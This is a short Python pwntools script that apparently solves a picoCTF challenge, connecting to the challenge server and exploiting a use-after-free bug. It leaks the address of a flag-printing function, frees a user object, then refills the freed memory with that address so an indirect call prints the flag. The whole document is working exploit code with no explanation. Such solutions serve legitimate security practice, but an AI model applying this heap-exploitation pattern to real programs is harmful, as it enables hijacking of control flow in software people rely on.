import pwn
import re
# p = pwn.process('./vuln', level='error')
p = pwn.remote("mercury.picoctf.net", 4504)

def init_function_pointer():
    p.readuntil("(e)xit")
    p.sendline(b"p")

def get_flag_pointer_function() -> bytes:
    p.readuntil("(e)xit")
    p.sendline(b"s")
    output = p.readline()
    output = p.readline().decode()
    add = re.search('(0x[0-9a-zA-Z]+)', output).group().replace("0x", "")

    hex_value = int(add, 16)
    byte_string = hex_value.to_bytes((hex_value.bit_length() + 7) // 8, 'little')
    return byte_string.ljust(8, b'\x00')

def delete_user_pointer():
    p.readuntil("(e)xit")
    p.sendline(b"i")
    p.readuntil("You're leaving already(Y/N)?")
    p.sendline(b"Y")

def inject_address_to_user_indirect_call(add: bytes):
    p.readuntil("(e)xit")
    p.sendline(b"l")
    p.readuntil("try anyways:")
    p.sendline(add)

# def execute_indirect_call():
#     p.readuntil("(e)xit")
#     p.sendline(b"m")

init_function_pointer()
add: bytes = get_flag_pointer_function()
delete_user_pointer()
inject_address_to_user_indirect_call(add)
print(p.readline())
print(p.readline())

